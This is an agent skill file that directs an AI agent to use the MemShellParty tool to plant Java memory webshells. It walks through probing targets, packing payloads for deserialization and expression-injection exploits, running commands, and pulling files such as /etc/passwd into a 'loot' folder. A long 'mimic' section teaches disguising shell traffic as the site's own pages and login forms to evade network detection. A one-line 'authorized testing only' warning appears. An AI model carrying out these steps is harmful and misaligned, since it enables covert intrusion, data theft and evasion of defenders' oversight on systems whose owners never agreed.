---
name: memshell-party
description: Generate Java memory shells and probe shells with MemShellParty (the `memparty` CLI or its MCP tools), verify deployed shells with `memparty connect`, run commands on them with `memparty exec`, and transfer files with `memparty upload`/`memparty download`. Includes the `mimic` site-mimicking protocol: the agent hand-writes a site profile (`memparty profile init`) so shell traffic blends into real business pages. Use when the user wants to build a Java web memory-shell payload (Godzilla / Behinder / AntSword / Command / Suo5 / NeoreGeorg / Proxy / Custom), probe a target middleware, test that a Godzilla / Behinder / suo5 shell is alive, execute commands on a Godzilla / Behinder shell, or move files through one — for authorized security testing, red-team engagements, or research only.
---

# MemShellParty skill

Generate Java memory shells and probe shells via the MemShellParty backend (`https://party.mem.mk`
by default, or a self-hosted instance). The same HTTP API powers the `party.mem.mk/ui` web app.

> ⚠️ Authorized testing only. Never generate or deploy a payload against a target you do not own or
> do not have explicit written permission to test. You are responsible for how these payloads are used.

## How to talk to the tool

Two equivalent interfaces — pick whichever is available:

- **CLI**: `memparty <command> [flags]` (install: `npm install -g memshell-party-cli`, or `npx memshell-party-cli`).
- **MCP tools** (if the `memshell-party` MCP server is connected): `list_servers`, `list_config`,
  `list_packers`, `list_command_configs`, `generate_memshell`, `generate_probe`, `parse_classname`,
  `server_version`, `connect_test`, `exec_command`, `download_file`, `upload_file`, `target_save`,
  `target_note`, `target_list`, `target_remove`, `log_list`.

The CLI is the source of truth for examples below; MCP tool args mirror the CLI flags
(`-s/--server` → `server`, `-t/--tool` → `shellTool`, `-y/--type` → `shellType`, `-p/--packer` → `packer`).

## Step 0 — Discover, don't guess

The backend supports ~17 servers, 9 shell tools, dozens of shell types, and 60+ packers. **Never
hard-code a server/packer name from memory.** Always enumerate first:

```bash
memparty config servers            # every server + its shell types
memparty config tools Tomcat       # one server's tools + types
memparty config packers            # packer parent/child tree
memparty config command            # Command-tool encryptors & implementation classes
```

Add `--json` for machine-readable output. Use the exact strings these return.

Sanity-check backend reachability first with `memparty version` (prints the CLI and backend
versions; over MCP: `server_version`).

## Step 1 — Pick the four core options

Every memory shell needs **server → shell tool → shell type → packer**.

### server
The target middleware/framework. Match it to the actual target (e.g. `Tomcat`, `Jetty`,
`SpringWebMvc`, `JBoss`, `WebLogic`, `Undertow`, `Resin`, `Struts2`…). Use `memparty config servers`
to confirm it's supported. If you only know "it's a Spring Boot app", that's `SpringWebMvc`.

### shell tool (what the memshell does once injected)
| Tool | Use when |
|------|----------|
| `Godzilla` | Godzilla-compatible encrypted webshell (pass + key) |
| `Behinder` | Behinder ("冰蝎") encrypted webshell (pass) |
| `AntSword` | AntSword ("蚁剑") webshell (pass) |
| `Command` | Single command execution / RCE (param name + encryptor) |
| `Suo5` / `Suo5v2` | SOCKS5 proxy tunnel via Suo5 |
| `NeoreGeorg` | NeoreGeorg tunneling shell |
| `Proxy` | Generic proxy (often WebSocket-based) |
| `Custom` | Your own `.class` bytecode (`--shell-class-file` or `--shell-class-base64`) |

### shell type (where it hooks into the server)
`Listener`, `Filter`, `Servlet`, `Valve`, `Handler`, `Customizer`… plus `Jakarta*` variants and
`Agent*` variants. Rules of thumb:
- **`Jakarta`-prefixed types** → target uses **Jakarta EE** (Servlet 5+, e.g. Tomcat 10+, Spring Boot 3).
  Non-prefixed → **javax** (Servlet 3/4, Tomcat 9 and below, Spring Boot 2).
- **`Agent`-prefixed types** → attach via a Java agent (needs the `AgentJar*` packer family, not class bytes).
- **`WebSocket*` / `Upgrade`** → hijack a WebSocket / HTTP-upgrade endpoint (stealthier; survives fewer
  filters). `Proxy` tool commonly pairs with `WebSocket` types.
- Not every tool supports every type — `memparty config tools <server>` shows the legal combinations.

### packer (how to deliver/instantiate the payload)
The packer must match the **delivery vector** (the vuln you're exploiting). Pick by scenario:

| Scenario / vuln | Packer family (leaf names) |
|-----------------|----------------------------|
| Class bytecode, base64 (manual load) | `DefaultBase64`, `Base64URLEncoded`, `GzipBase64` |
| Drop a JSP file | `JSP`, `ClassLoaderJSP`, `DefineClassJSP`, `JSPX`, … |
| `Class.forName` / `defineClass` via big int | `BigInteger` |
| BCEL-encoded classloading | `BCEL` |
| `TemplatesImpl` (XSLT translet) RCE | `JDKAbstractTransletPacker`, `XalanAbstractTransletPacker`, `OracleAbstractTransletPacker` |
| Script engine eval (`ScriptEngineManager`) | `ScriptEngine`, `DefaultScriptEngine`, `ScriptEngineBigInteger` |
| Expression injection | `SpEL`, `OGNL`, `EL`, `MVEL`, `Aviator`, `JEXL`, `JXPath`, `Groovy`, `Velocity`, `Freemarker`, `JinJava`, `BeanShell`, `Rhino` |
| Java deserialization gadget chain | `JavaCommonsBeanutils19/18/17/16/110`, `JavaCommonsCollections3/4` (under `JavaDeserialize`) |
| Hessian deserialization | `HessianDeserialize`, `Hessian2Deserialize` (+ `*XSLTScriptEngine` variants) |
| `XMLDecoder` RCE | `XMLDecoder`, `XMLDecoderScriptEngine`, `XMLDecoderDefineClass` |
| Java agent attach (needs `Agent*` shell type) | `AgentJar`, `AgentJarWithJDKAttacher`, `AgentJarWithJREAttacher` |
| H2 DB console / arbitrary JDBC | `H2`, `H2Javac`, `H2JS`, `H2JSURLEncode` |
| Whole payload as a runnable JAR | `Jar`, `ScriptEngineJar`, `GroovyTransformJar` |
| XXL-JOB endpoint | `XxlJob` |

> **Aggregate vs leaf packers:** parent packers like `Base64`, `JSP`, `JavaDeserialize`,
> `AbstractTranslet`, `ScriptEngine`, `OGNL`, `SpEL`… return *several* variants at once
> (`allPackResults`). For a single payload, pick a **leaf** (child) packer. Run
> `memparty config packers` to see the parent→child tree.

## Step 2 — Probe (fingerprint first when unsure)

If you don't know the target middleware, generate a **probe** to detect it before committing to a
memshell. Probes have a strict method × content matrix — only these combos work:

| Method (`-m`) | Supported contents (`-c`) | Extra flags |
|---------------|---------------------------|-------------|
| `DNSLog` | `Server`, `JDK` | `--host <dnslog.domain>` |
| `Sleep` | `Server` only | `--sleep-server <guess> --seconds N` |
| `ResponseBody` | `Command`, `Bytecode`, `Filter`, `ScriptEngine` | `--server <guess> --req-param-name <p>` (Command also takes `--command-template`) |

> `OS`, `BasicInfo` are enum values but **not usable** through any method — don't use them.

```bash
# Blind: does the target resolve our DNS? Which server is it?
memparty probe -m DNSLog -c Server -p DefaultBase64 --host xxx.dnslog.cn

# Time-based blind fingerprint (server responds after N seconds if it's --sleep-server)
memparty probe -m Sleep -c Server -p DefaultBase64 --sleep-server Tomcat --seconds 5

# OOB-visible: run a command and echo it into the HTTP response body
memparty probe -m ResponseBody -c Command -p DefaultBase64 --server Tomcat --req-param-name p
```

The detected server name from a probe is exactly the `server` value to use for `memparty gen`.

## Step 3 — Generate

```bash
memparty gen -s <server> -t <tool> -y <type> -p <packer> [tool-specific flags] [--jdk <v>]
```

Common tool-specific flags:
- Godzilla: `--godzilla-pass`, `--godzilla-key`
- Behinder: `--behinder-pass`
- AntSword: `--antsword-pass`
- Command: `--command-param-name`, `--encryptor RAW|BASE64|DOUBLE_BASE64`, `--implementation-class RuntimeExec|ForkAndExec`, `--command-template`
- All webshell tools: `--header-name` / `--header-value` (auth header the shell checks)
- Custom: `--shell-class-file path.class` (or `--shell-class-base64`)
- Injector: `--url-pattern /*`, `--injector-class-name`, `--no-static-initialize`

Output:
- payload → **stdout** by default.
- `-o shell.class` / `-o shell.jar` → auto base64-decodes and writes binary.
- `--json` → full response (class names, sizes, base64 bytes, config echo) for downstream tooling.

## Step 4 — Verify the shell is alive

Once a shell is injected/uploaded, `memparty connect` does the real protocol handshake and tells
you whether it works (exit 0/1):

```bash
memparty connect -u <shell-url> -t godzilla --pass <pass> --key <key>   # defaults pass/key
memparty connect -u <shell-url> -t behinder --pass <pass>               # default rebeyond
memparty connect -u <shell-url> -t suo5                                 # add --suo5-mode v2|v1 to force
```

MemShellParty shells check an auth header — take `headerName`/`headerValue` from the
`gen --json` output (`shellToolConfig`) and pass them along, or every check fails with an empty
response (the Suo5v2 shell checks it too):

```bash
memparty connect -u <shell-url> -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <headerValue-from-gen-json>
```

Over MCP the same check is the `connect_test` tool (`url`, `tool`, `pass`/`key`,
`headerName`/`headerValue`, `suo5Mode`).

Self-signed TLS → add `-k/--insecure`; extra headers (cookies etc.) → repeatable
`-H "Name: value"`. Both flags exist on `exec` too (over MCP: `insecure`, `timeoutMs`).

## Step 5 — Execute commands on the shell

Once the handshake passes, `memparty exec` runs a command on a Godzilla / Behinder shell and
prints the remote stdout+stderr (exit 0/1). Pass the same credentials and gate header as for
`connect`:

```bash
memparty exec -u <shell-url> -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <headerValue-from-gen-json> \
  --cmd "whoami"
memparty exec -u <shell-url> -t behinder --pass rebeyond \
  --header-name User-Agent --header-value <headerValue-from-gen-json> \
  --cmd "id"
```

- Godzilla auto-detects the remote OS via `getBasicsInfo` (one extra request) to pick
  `cmd.exe /c` vs `/bin/sh -c`; add `--os windows|linux` to skip the detection.
- Behinder's `Cmd` payload detects the OS itself, so no flag is needed.
- `--json` returns `{ ok, tool, url, command, output, durationMs }` — preferred for agents.

Over MCP this is the `exec_command` tool (`url`, `tool`, `command`, `pass`/`key`, `os`,
`headerName`/`headerValue`).

## Step 6 — Transfer files

`memparty upload` / `memparty download` move files through a Godzilla / Behinder shell (the
real protocol — chunked, with integrity verification: remote size for Godzilla, MD5 for
Behinder). Same credentials and gate header as `exec`:

```bash
memparty download -u <shell-url> -t godzilla --pass pass --key key \
  --header-name User-Agent --header-value <headerValue-from-gen-json> \
  /etc/passwd -o loot/passwd
memparty upload web1/bh9060 ./fscan.exe "C:\Windows\Temp\f.exe"
```

- Download refuses to overwrite an existing local file unless `--force`; `-o` naming a
  directory keeps the remote basename; no `-o` means `./<basename>`.
- Upload overwrites the remote path (truncate + write), max 64 MiB per file; a failed
  upload warns that the remote file may be partial.
- Godzilla transfers cap at 2 GiB (payload int limit); downloads are buffered in memory.
- Non-ASCII remote paths: fine on Behinder as-is. On Godzilla the path is decoded by the
  server's platform charset — UTF-8 on JDK 18+/Linux; for old JDK (8/11/17) on Chinese
  Windows pass `--remote-charset GBK` (MCP: `remoteCharset`).
- `--json` returns `{ ok, tool, url, direction, remotePath, localPath, bytes, durationMs }` —
  file bytes never travel over MCP/stdout.

Over MCP these are the `download_file` (`remotePath`, optional `localPath`, `force`) and
`upload_file` (`localPath`, `remotePath`) tools, plus the usual connection fields. The local
paths are on the machine running the MCP server.

## Site-mimicking traffic (mimic protocol)

`mimic` is a demo protocol that shapes shell traffic after the target site's own pages:
requests are browser-style form POSTs; responses are real site pages with the ciphertext
hidden in a per-shell-unique marker (a JS variable or an HTML comment). The wire codec is
selectable per profile (`cipher` section: AES/ECB, AES/CBC with random IV, or XOR; base64 /
base64url / hex; optional key-derived junk tail). **You write the site profile — the CLI
does not crawl.** That is the point: you can judge which page makes believable cover; a
regex crawler cannot.

### Workflow

1. **Read the site yourself.** Fetch the homepage and 2-3 representative pages (plus the 404
   page). Note the page structure, `<title>` style, link paths, Content-Type — and judge what
   the site's **dominant traffic** looks like: a content site serves mostly HTML documents,
   an SPA serves mostly JSON XHR, an admin console serves mostly form POSTs.
2. **Match the dominant traffic first.** Blending in is a statistics game: your requests
   should be the same *shape* as what the site already serves all day. A content site
   serves HTML documents; an SPA serves JSON XHR; an AI product streams SSE — mimic
   covers all of them: HTML pages (marker injected) or **any text response with a
   `{{payload}}` placeholder** (JSON envelope, XML, JS, SSE chunks…) served with its
   own contentType (a `text/event-stream` skin is flushed chunk by chunk, not as a
   one-shot body), and form, JSON, or **fully templated request bodies**.
3. **Scaffold + hand-write the profile:**

   ```bash
   memparty profile init acme --site http://target:8080
   ```

   This writes a skeleton to `~/.memparty/profiles/acme.json`. Now **edit that file with your
   own file tools** — the CLI has no "fill" command; the content is your judgment, not a
   command's output. Fill in:
   - `templates`: **one or more** cover pages — the server rotates among them per response,
     so the traffic doesn't repeat one page's length/hash. 2-4 pages is plenty; pick
     **high-traffic, self-contained** ones (the pages real users fetch all the time), and
     paste each HTML **verbatim** — do not "improve" it, real bytes are the whole point.
     Each entry keeps its own `title` and `contentType`.
   - With `--dynamic-path`, also probe what the site returns for a **random** path
     (`curl -i <site>/<random>`): some consoles answer 200 with the login page for *every*
     unknown path instead of a 404. Your templates should match that default response —
     a 200 answer from the shell then mirrors the site's own behavior exactly.
   - `paths`: the site's real path vocabulary, weighted toward the hot prefixes real traffic
     hits (nav links, sitemap entries — not dead corners), e.g. `["/api/", "/news/", "/app/"]` —
     first-level dirs, same origin only. Used for `--dynamic-path`.
   - `request` (optional but recommended): the request's form shape — **one object or an
     array the client rotates among** (with optional `weight`). `secretField` is the field
     that carries the ciphertext; `secretIn` is where it rides: `"body"` (default, a form
     field), `"query"` (a URL parameter) or `"header"`; `fields` are decoys. **Model it on
     a real form the site already receives** — e.g. a console login POST. Value placeholders:
     `{{hex:N}}` (N hex), `{{b64:N}}` (N base64url), `{{uuid}}`, `{{ts}}` (unix seconds),
     `{{int:A:B}}`. Never ship the default `pass=<cipher>` single-field body — a lone
     `pass=` parameter is a textbook webshell signature.
   - `request.bodyTemplate` (optional, secretIn=body only): a **full request body** with
     `{{payload}}` where the ciphertext goes — for traffic a flat form/JSON body can't
     imitate: an OpenAI-style chat completion (`{"model":…,"messages":[{"role":"user",
     "content":"{{payload}}"}]}`, pair with an SSE skin), a GraphQL envelope, an XML/SOAP
     message, or a multipart/form-data upload (write the boundary literally in the
     template — the Content-Type boundary is inferred from its first delimiter line, or
     set it explicitly in `headers`). Decoy macros render per request. The filter
     extracts the field from any raw body (JSON / multipart / XML anchors), so no
     server-side change is needed per format.
   - `cipher` (optional): the wire codec. Fields (all optional, defaults = the legacy
     format `aes-ecb` + `base64` + `js-var` + no tail):
     - `algorithm`: `"aes-ecb"` (fixed blocks — same plaintext ⇒ same ciphertext),
       `"aes-cbc"` (random IV per message — same command encrypts differently every
       time, the strongest default), `"xor"` (no JCE needed).
     - `encoding`: `"base64"` | `"base64url"` | `"hex"`.
     - `padTail`: `true` appends key-derived-length (0-15) random alnum garbage after
       the encoded ciphertext — Behinder's `aes_with_magic` trick against length
       signatures. Costs nothing, turn it on.
     - `marker`: `"js-var"` (`var Re<md5(pass+key)[0:5]>_config="..."`) or
       `"html-comment"` (`<!--Re..._config:...-->`) — pick whichever looks more at
       home in the cover page.
     ⚠️ The cipher is **baked into the filter at build time**. Editing `cipher` in the
     profile afterwards desynchronizes client and server — rebuild + re-inject.
4. **Use it:**

   ```bash
   memparty connect -u http://target/ -t mimic --pass <pass> --key <key> \
     --profile acme --dynamic-path
   memparty exec acme/mimic --cmd "whoami"   # profile rides along in the saved target
   ```

### Worked example

Target: a company portal at `http://192.0.2.1:8080` — a classic content site (HTML
documents dominate; no SPA).

1. Fetch `/` and two linked pages. Observations: every page shares the same header/footer;
   `/news/` is linked from the nav and returns a short self-contained list page; the nav
   links are `/products/`, `/news/`, `/about/`; everything is `text/html; charset=utf-8`.
2. `memparty profile init acme --site http://192.0.2.1:8080`.
3. Edit `~/.memparty/profiles/acme.json` so it reads (template shortened here for display —
   the real file must contain the page's FULL verbatim HTML):

   ```json
   {
     "name": "acme",
     "site": "http://192.0.2.1:8080",
     "createdAt": "2026-07-19T08:00:00.000Z",
     "templates": [
       {
         "title": "新闻动态 - ACME 科技",
         "template": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>...full verbatim HTML...</html>",
         "contentType": "text/html; charset=utf-8"
       },
       {
         "title": "产品中心 - ACME 科技",
         "template": "<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>...another page...</html>",
         "contentType": "text/html; charset=utf-8"
       }
     ],
     "paths": ["/products/", "/news/", "/about/"],
     "request": {
       "secretField": "verCode",
       "fields": [
         {"name": "csrftoken", "value": "{{hex:32}}"},
         {"name": "j_username", "value": "admin"},
         {"name": "j_password", "value": "{{hex:24}}"},
         {"name": "agreement", "value": "on"}
       ]
     }
   }
   ```

   Why these choices: `/news/` over the homepage — equally high-traffic but no carousel
   JS/images, so no missing sub-request waterfall; two templates so consecutive responses
   differ in length and bytes; `paths` are exactly the nav links real users click, not
   guessed words; the `request` block mirrors the site's own login form, so the shell POST
   is indistinguishable from someone signing in. (Templates shortened here for display —
   the real file must contain each page's FULL verbatim HTML. A legacy single
   `template`/`title`/`contentType` triple still loads, it just can't rotate.)
4. Verify it parses, then connect:

   ```bash
   memparty profile show acme      # schema check happens here too
   memparty connect -u http://192.0.2.1:8080/ -t mimic --pass s3cr3t --key k3y \
     --profile acme --dynamic-path
   # OK   mimic http://192.0.2.1:8080/
   #      round-trip ok (profile=acme; dynamic path http://192.0.2.1:8080/news/x7q2mzab)
   ```

### What mimic handles vs. what you decide

- Automatic: the selected codec (key = md5(key)[0:16] for every algorithm), per-shell
  derived response delimiters, form-body encoding, browser-consistent request headers,
  credential round-trip on `connect`.
- Yours: the template page, the path vocabulary, the request pacing. Filter/listener-type
  memory shells answer on any path, which is what makes `--dynamic-path` legitimate — for a
  fixed-URL shell just omit the flag.
- Limits: exec only (no upload/download); request timing/method mix is fixed, so pace your
  commands like a patient human.

### Server side — `memparty custom build`

The server half is a plain `javax.servlet.Filter` generated FROM the profile and compiled
locally — one command does the whole chain:

```bash
memparty custom build --profile acme --server Tomcat
```

What happens inside:

1. renders `MimicFilter<rand>.java` from the profile (templates, carrier fields, **the
   `cipher` section is baked in here**) + random `pass`/`key` (or `--pass/--key`);
2. compiles it with the local JDK (`javac` on PATH, servlet API jar bundled — no other
   dependency);
3. submits the class to the MemShellParty backend as `shellTool=Custom`, which wraps it
   with the injector for `--server` (any server from `memparty config tools` — the filter
   itself has zero middleware specifics) and packs it with `--packer`
   (default `DefaultBase64`);
4. writes an output dir (default `<profile>-build/`): the `.java`/`.class`, one
   `payload-*.txt` per pack variant, and **`manifest.json`** — the single source of truth
   for the follow-up (credentials, cipher, class names, ready-made connect command).

Then: inject the payload through your foothold (deserialization RCE `defineClass`, an
existing shell that evaluates scripts, an agent loader…), and connect with the printed
command — a successful `connect` auto-saves the target, afterwards
`memparty exec <host>/mimic --cmd "id"` needs no flags.

Notes that matter:

- **Random class name every build** (`--out` keeps builds apart): a running JVM can't
  re-define a class, so re-injection NEEDS the fresh name — never reuse one.
- The printed `--pass/--key` are random per build unless you pin them; they're in
  `manifest.json`, not in your shell history if you use `--json`.
- The filter probes carriers with `getParameter()`/`getHeader()` only (never reads the
  body stream), passes undecryptable values through `chain.doFilter`, and answers errors
  with the plain cover page — it coexists with the site's real forms and other shells.
- Filter-type deployment truth learned on a real console: **dynamic path is conditional
  on the target app's own filters** — probe a random path first, fall back to the fixed
  working path when the app answers everything itself.

### Reality check before relying on it

Run `memparty demo` once and read the printed request URL and response: the traffic should
be indistinguishable from a normal page view at a glance. Two ways it still stands out:

- **Missing sub-requests**: if your template page has assets (CSS/JS/images) a real browser
  would fetch, a NDR notices their absence — prefer self-contained pages.
- **Volume mismatch**: signature devices look at bodies, but statistical detection looks at
  baselines — hitting a rarely-used path shape (or HTML on an API site) deviates from it.
  That is why the dominant-traffic rule above outranks everything else.

## Step 7 — Save targets, switch by name

Flag soup gets old fast. Save each working shell into a **project** (a named group of shells
with an optional remark and category), then reference it as `<project>/<shell>`:

```bash
memparty save web1/bh9060 -u <shell-url> -t behinder --pass rebeyond \
  --header-name User-Agent --header-value <headerValue-from-gen-json> \
  --remark "内网测试环境" --category test --shell-remark "root 权限"
memparty list                      # everything, or --category test
memparty exec web1/bh9060 --cmd "whoami" # no other flags needed
memparty exec web1 --cmd "id"            # bare project works when it holds one shell
```

MCP equivalents: `target_save` (project, shell, url, tool, creds, `projectRemark`,
`projectCategory`, `shellRemark`), `target_list` (optional `category` filter), `target_note`
(project meta, or a shell's remark when `shell` is given), `target_remove`; then pass
`name: "<project>/<shell>"` to `connect_test` / `exec_command`.
The store lives at `~/.memparty/targets.json`.

## Step 8 — Audit with the operation log

Every operation (gen, probe, connect, exec, download, upload, save/note/remove) is appended to
`~/.memparty/operations.jsonl` — no credentials, no payload bytes, no file contents; exec output
is truncated.
Query it to recall what was done against a target:

```bash
memparty log --category exec --target web1
```

Over MCP this is the `log_list` tool (`category`, `target`, `limit`). Use it to review past
actions before repeating them, or to answer "what did we run on this host?".

## Gotchas

- **Jakarta vs javax.** Tomcat 10+ / Spring Boot 3 → `Jakarta*` shell types. Tomcat 9- / Spring Boot 2
  → non-prefixed. Picking the wrong family = the shell won't load.
- **JDK target.** `--jdk java6/8/9/11/17/21` (or bare `8`, or raw major `52`). Match (or stay ≤) the
  target's JDK so the bytecode loads. JDK 9+ auto-enables Java-module bypass unless `--no-bypass-module`.
- **Spring-gzip packers** (`SpEL`/`OGNL`/`JXPath` + their `*SpringGzip*` / `*JDK17` variants) need a
  special injector class name — the CLI generates one automatically; don't override
  `--injector-class-name` for these.
- **Shrink is on by default** (smaller bytecode). Use `--no-shrink` only if a stripped payload misbehaves.
- **Aggregate packers** return multiple variants — pick a leaf for a single payload (see Step 1).
- **Agent memshells** (`Agent*` types) require the `AgentJar*` packer family and a JVM attach; they
  aren't class-byte payloads.
- **Backend override.** Default is the public `https://party.mem.mk` (good for trying things, but
  don't trust payloads from public services in real engagements — self-host with Docker and use
  `MEMPARTY_API_URL` or `--api`).

## Reverse: parse a class name

Got a `.class` and want its fully-qualified name (e.g. to confirm what you generated or analyze a sample)?

```bash
memparty parse-classname --file shell.class
memparty parse-classname <base64-of-class-bytes>
```
